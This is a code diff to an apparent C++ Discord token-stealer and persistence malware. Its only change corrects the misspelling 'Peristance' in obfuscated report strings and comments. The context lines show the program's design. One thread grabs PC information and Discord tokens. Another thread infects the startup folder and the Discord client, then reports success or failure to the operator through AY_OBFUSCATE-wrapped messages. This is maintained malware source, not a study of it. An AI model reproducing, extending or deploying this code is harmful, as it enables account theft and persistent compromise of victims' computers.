@@ -111,16 +111,16 @@ void InfectRoutine()
 		
 		// Report
 		if (!fs::exists(startup_path) && !fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **failed**\nDiscord Infection: **failed**"));
+			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **failed**\nDiscord Infection: **failed**"));
 
 		if (!fs::exists(startup_path) && fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **failed**\nDiscord Infection: **success** (%s)"), discord_path);
+			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **failed**\nDiscord Infection: **success** (%s)"), discord_path);
 
 		if (fs::exists(startup_path) && !fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **failed**"), startup_path);
+			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **failed**"), startup_path);
 
 		if (fs::exists(startup_path) && fs::exists(discord_path))
-			std::sprintf(report_msg, AY_OBFUSCATE("**Peristance/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **success** (%s)"), startup_path, discord_path);
+			std::sprintf(report_msg, AY_OBFUSCATE("**Persistence/Infection**\nPC Infection: **success** (%s)\nDiscord Infection: **success** (%s)"), startup_path, discord_path);
 		Modules::CleoReport(report_msg);
 	}
 	catch (const std::exception& e) {
@@ -141,7 +141,7 @@ int main()
 		std::this_thread::sleep_for(std::chrono::seconds(1));
 
 	std::thread mr(MainRoutine); // Get PC information and find all discord tokens - info grab.
-	std::thread ir(InfectRoutine); // Infect the computer & discord - persistance/infection.
+	std::thread ir(InfectRoutine); // Infect the computer & discord - persistence/infection.
 	// Thread Managing
 	if (mr.joinable())
 		mr.join();
